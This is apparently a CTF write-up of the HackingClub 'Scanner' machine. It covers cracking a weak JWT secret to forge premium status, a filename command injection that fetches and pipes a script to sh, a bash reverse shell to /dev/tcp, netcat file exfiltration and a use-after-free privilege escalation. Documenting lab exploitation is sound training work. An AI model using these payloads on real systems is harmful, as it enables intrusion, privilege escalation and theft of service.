---
layout: post
title:  "Scanner"
date:   2025-03-22 18:48:00 -0300
tags: ctf hackingclub
level: medium
description: a machine about JWT Weak secret, Command injection & Use-After-Free exploitation.
---

# introduction

This article presents the successful exploitation of a command injection through file name parsing into semgrep scan, bypassing subscription filters via JWT token modification, and performing reverse engineering on a binary file to detect and exploit UAF (Use After Free) for privilege escalation.

The exploitation was carried out on a CTF machine from the [hackingclub](https://hackingclub.com) platform.

# reconnaissance

To initiate the exploitation process, it's essential to first understand the target environment. We begin by using Nmap to scan the machine’s IP address and identify which ports are open.

{% highlight bash %}
> nmap -sV 172.16.6.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 18:58 -03
Nmap scan report for 172.16.6.67
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.28 seconds
{% endhighlight %}

Ports 22 and 80 were found to be open, indicating the presence of an SSH service and a web application. 

Upon accessing the web application, it was identified as a JavaScript file scanner. Additionally, login and user registration buttons were visible, suggesting the presence of user authentication functionality.

![first_web_access]({{ "/assets/image/hacking_club_scanner/app.png" | relative_url }})

When attempting to scan a file, the application redirects to a subscription screen.

![subscription_screen]({{ "/assets/image/hacking_club_scanner/premium.png" | relative_url }})

To proceed, the registration and login flow was tested to explore how premium status might be obtained on the platform. A new account was created using the email 'teste@teste.com' and the password '123456'. Upon successful login, a JWT token was received in response:

![login]({{ "/assets/image/hacking_club_scanner/login.png" | relative_url }})

# forging premium status

The token was analyzed using a JWT debugger to identify any potentially useful information managed by the application.

![jwt-debug]({{ "/assets/image/hacking_club_scanner/jwt-premium.png" | relative_url }})

Bingo! It was discovered that the platform's subscription status is controlled by a flag within the JWT. The next step is to determine how to alter this value without knowing the token’s secret. As a standard approach, a brute-force attack was attempted against the JWT using a known wordlist. If the secret is weak, it's possible to modify the payload and re-sign the token while keeping it valid.

Using `jwt-cracker` with the wordlist `seclists/Passwords/darkweb2017-top10000.txt`, the secret was successfully identified:

{% highlight bash %}
> jwt-cracker <token> -d /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
SECRET FOUND: 1a2b3c4d
Time taken (sec): 0.042
Total attempts: 9999

{% endhighlight %}

Now that we have the secret, signing up for the platform without paying becomes straightforward. On jwt.io, we simply modify the "premium" flag to "true" and insert the identified secret to re-sign the token.

![forge-premium-subscription]({{ "/assets/image/hacking_club_scanner/forged-token.png" | relative_url }})

We’re premium! :D

# scanning our first file

After successfully signing up for the platform by modifying the "premium" flag in the payload of our JWT token, a scan was performed on a random JS file to examine the scanning process. Upon submitting the file for analysis, the following scan output was returned by the tool "semgrep":

![scan-response]({{ "/assets/image/hacking_club_scanner/scan-response.png" | relative_url }})

In simple terms, Semgrep is a Static Application Security Testing (SAST) tool that can be run via the command line. To scan a file, you only need to execute the following command:

{% highlight bash %}
> semgrep scan path/to/file
{% endhighlight %}

By running this command, Semgrep will scan the specified file(s) and display the output we received in the response. We can infer that the application we are targeting likely performs a similar process:

{% highlight javascript %}
app.post('/api/v1/upload', (req, res) => {
    // SAVE FILE BEFORE SCAN
    res.send(exec('semgrep scan $(req.body.filename)', (err, stdout, stderr) => {
      return stdout;
    }));
});
{% endhighlight %}

If the application works as we expect, we can attempt to explore a potential vulnerability during the file scanning process.

It's important to note that the application only allows files with the '.js' extension. We observed that the validation checks only the last three characters of the filename to ensure they are '.js'.

With this, it would be possible to craft a payload like: filename$(cmdhere).js

To verify if the payload is working, I prefer to set up a server to receive a request from the application. This helps confirm if the vulnerability was successfully exploited.

The payload would then be: filename$(curl myip).js

To receive the request, we can set up a simple server in Python.

![initserver]({{ "/assets/image/hacking_club_scanner/initserver.png" | relative_url }})

When executing the command, the server received the following request:

![recvd_connection]({{ "/assets/image/hacking_club_scanner/recvd_connection.png" | relative_url }})

Done. Command injection successfully validated! Now, the goal is to gain access to the server through a reverse shell. To achieve this, I created an `index.html` file containing a bash reverse shell and hosted it on the Python server.

Content of index.html:
{% highlight javascript %}
/bin/bash -c 'sh -i >& /dev/tcp/10.0.20.223/4444 0>&1'
{% endhighlight %}

When the request is made to my server, the content of index.html—which contains the reverse shell—will be executed. To achieve this, the following payload needs to be sent in the command injection: {% highlight bash%} filename$(curl ip\|sh).js {% endhighlight %}

After sending the request, we successfully establish the reverse shell:

![recv_shell]({{ "/assets/image/hacking_club_scanner/recv_shell.png" | relative_url }})

Therefore, the next step is to investigate the server briefly in order to retrieve the first flag, located at `/home/svc_web/user.txt`.

![first_flag]({{ "/assets/image/hacking_club_scanner/first_flag.png" | relative_url }})

# privilege escalation

After conducting an initial reconnaissance on the server, no obvious avenues for privilege escalation were found. There are no binaries with misconfigured capabilities, no SUID files, and we don’t have the password for the `svc_web` user to gain sudo access.

However, while listing the root processes running on the server, we discovered an open socket on port 9717, associated with a binary located at `/opt/secure_vault`:

![socat-secure-vault]({{ "/assets/image/hacking_club_scanner/socat-secure-vault.png" | relative_url }})

Upon connecting to port 9717, it was observed that a login is required to access the application.

![secure_vault_login]({{ "/assets/image/hacking_club_scanner/secure_vault_login.png" | relative_url }})

The binary will need to be analyzed to understand how to bypass the login. To accomplish this, the file was downloaded using netcat.

In the server:

{% highlight bash%}
> nc -lvp 8293 < /opt/secure_vault
{% endhighlight %}

in my local: 

{% highlight bash%}
> nc serverip 8293 > secure_vault
{% endhighlight %}

Now, the strings command can be run on the binary to check for any hardcoded passwords.

![strings]({{ "/assets/image/hacking_club_scanner/strings.png" | relative_url }})

Nothing useful was found. The output only reveals some sort of menu (likely displayed after login) and terms like "admin" and "guest." Several combinations of these words were tested for the login (using "guest" as the user and "admin" as the password, and vice versa), but none of them worked.

Lets feed the GHidra.

Opening the binary in Ghidra, we can identify that the program shows the login menu and execute the auth with an specific function:

![secure_vault_main]({{ "/assets/image/hacking_club_scanner/secure_vault_main.png" | relative_url }})

Analyzing the "auth" function reveals that the "guest" user does not require a password to log into the vault.

![secure_vault_auth_function]({{ "/assets/image/hacking_club_scanner/secure_vault_auth_function.png" | relative_url }})

After authenticating the user, the program displays a `main_menu` offering options to create, read, and delete a vault, as well as a logout option.

By analyzing the program's functions, it was determined that the variable `local_30` holds the value `/root/secure_vault/vaults/(user)`, which is used to list the contents of the logged-in user's vaults. For the "guest" user, this would be something like `/root/secure_vault/vaults/guest`.

![local_30_usage]({{ "/assets/image/hacking_club_scanner/local_30_usage.png" | relative_url }})

Upon closer inspection of the logout function, it was observed that when the user logs out, the program uses the `free` function to clear the memory address allocated for `local_30`. Immediately after, it allocates memory for the `local_50` variable, which is a pointer used to store the user's username. As a result, `local_50` and `local_30` end up sharing the same memory address.

![uaf]({{ "/assets/image/hacking_club_scanner/uaf.png" | relative_url }})

Thus, the following steps can be followed to gain access to the `/root` directory:

1. Login as the "guest" user.
2. Logout.
3. Login again, entering `/root` as the username and any arbitrary password.
4. The program will continue executing, and at this point, the value of the `local_30` variable will be `/root`, allowing access to read and write files in that directory.

By following these steps, the root flag can be obtained:

root_flag.

Basically, the analyzed binary was vulnerable to a Use-After-Free condition. During the logout process, when the memory address allocated for the `local_30` variable was freed and 300 bytes of memory were immediately allocated for the `local_50` variable, both variables ended up sharing the same memory address. This allowed us to modify the value of the `local_30` variable, enabling us to list a directory that isn't a vault, but the root directory of the server. As a result, we were able to complete the Scanner challenge \:D
